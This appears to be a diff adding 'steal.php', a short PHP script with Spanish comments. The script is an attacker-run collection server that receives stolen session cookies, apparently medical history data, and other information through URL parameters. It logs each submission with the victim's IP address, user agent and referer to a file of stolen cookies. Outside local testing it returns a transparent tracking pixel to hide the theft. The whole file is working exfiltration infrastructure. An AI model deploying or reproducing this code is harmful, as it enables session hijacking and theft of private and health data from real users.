@@ -1,0 +1,58 @@
+<?php
+// steal.php - Servidor del atacante para robo de datos
+
+// Crear directorio de logs si no existe
+$logDir = __DIR__ . '/storage/logs/';
+if (!is_dir($logDir)) {
+    mkdir($logDir, 0777, true);
+}
+
+$logFile = $logDir . 'cookies_robadas.txt';
+
+// Obtener datos del ataque
+$cookie = $_GET['cookie'] ?? 'No se recibió cookie';
+$historial = $_GET['historial'] ?? 'No se recibió historial';
+$info = $_GET['info'] ?? 'No se recibió info';
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'No disponible';
+$ip = $_SERVER['REMOTE_ADDR'] ?? 'No disponible';
+$referer = $_SERVER['HTTP_REFERER'] ?? 'No disponible';
+$tiempo = date('Y-m-d H:i:s');
+
+// Formatear el mensaje
+$mensaje = "========================================\n";
+$mensaje .= "⏰ Fecha: $tiempo\n";
+$mensaje .= "📱 IP: $ip\n";
+$mensaje .= "🌐 User-Agent: $userAgent\n";
+$mensaje .= "🔗 Referer: $referer\n";
+
+if ($cookie != 'No se recibió cookie') {
+    $mensaje .= "🍪 Cookie Robada: $cookie\n";
+}
+
+if ($historial != 'No se recibió historial') {
+    $mensaje .= "🏥 DATOS DEL HISTORIAL ROBADOS:\n";
+    $mensaje .= json_decode($historial, true) 
+        ? json_encode(json_decode($historial, true), JSON_PRETTY_PRINT) 
+        : $historial;
+    $mensaje .= "\n";
+}
+
+if ($info != 'No se recibió info') {
+    $mensaje .= "📊 Info Adicional: $info\n";
+}
+
+$mensaje .= "========================================\n\n";
+
+// Guardar en el archivo
+file_put_contents($logFile, $mensaje, FILE_APPEND);
+
+// Mostrar que funcionó (en desarrollo)
+if ($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1') {
+    echo "✅ Datos recibidos y guardados en: $logFile\n";
+    echo "<pre>" . htmlspecialchars($mensaje) . "</pre>";
+} else {
+    // En producción, responder con una imagen transparente
+    header('Content-Type: image/gif');
+    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
+}
+?>
